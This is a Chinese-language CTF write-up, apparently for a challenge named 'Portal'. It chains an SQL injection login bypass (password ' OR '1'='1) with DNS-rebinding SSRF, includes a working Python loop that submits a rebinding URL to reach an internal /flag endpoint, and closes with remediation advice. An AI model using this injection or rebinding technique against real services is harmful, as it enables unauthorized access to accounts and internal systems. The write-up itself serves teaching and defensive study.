# Portal

## 题目简述

公开站点提供登录和仅管理员可用的 URL 预览器，内部服务则在本机 5000 端口暴露 `/flag`。利用链分两步：登录查询的字符串拼接允许 SQL 注入取得管理员会话；SSRF 校验和实际请求分别解析域名，允许 DNS rebinding 在两次解析间切换到 `127.0.0.1`。

## 解题过程

登录代码直接拼接：

```python
query = (
    f"SELECT username, role FROM users WHERE username = '{username}' "
    f"AND password = '{password}'"
)
```

以用户名 `admin`、密码 `' OR '1'='1` 登录，查询条件变为：

```sql
username = 'admin' AND password = '' OR '1'='1'
```

`AND` 优先于 `OR`，整体恒真；函数随后又按传入用户名读取用户对象，因此会返回真实的 admin 账户并建立管理员 session。

URL 校验先调用 `socket.gethostbyname`，拒绝私网、环回、保留和链路本地地址；通过后却把原域名交给 `requests.get`，触发第二次解析。准备一个在公网地址和 `127.0.0.1` 间快速轮换的 rebinding 域名，目标端口写为 5000。第一次解析命中公网便通过，第二次命中环回就会请求内部 `/flag`。

赛时可循环并发提交以覆盖 DNS 切换窗口：

```python
import requests

base = "http://TARGET"
session = requests.Session()
session.post(
    f"{base}/login",
    data={"username": "admin", "password": "' OR '1'='1"},
)

target = "http://REBIND_DOMAIN:5000/flag"
while True:
    response = session.post(
        f"{base}/dashboard",
        data={"target_url": target},
        timeout=5,
    )
    if "grey{" in response.text:
        print(response.text)
        break
```

内部 Flask 服务返回 JSON：

```text
grey{reb1nd_th1s_m8}
```

## 方法总结

认证绕过和 SSRF 必须串联：普通用户即使能登录也不能发起预览。DNS rebinding 的根因是“检查时解析”和“使用时解析”分离；修复时应在一次解析后把已验证 IP 固定给连接，并在重定向、IPv6 和所有解析结果上重复执行同一地址策略。登录查询则必须参数化。
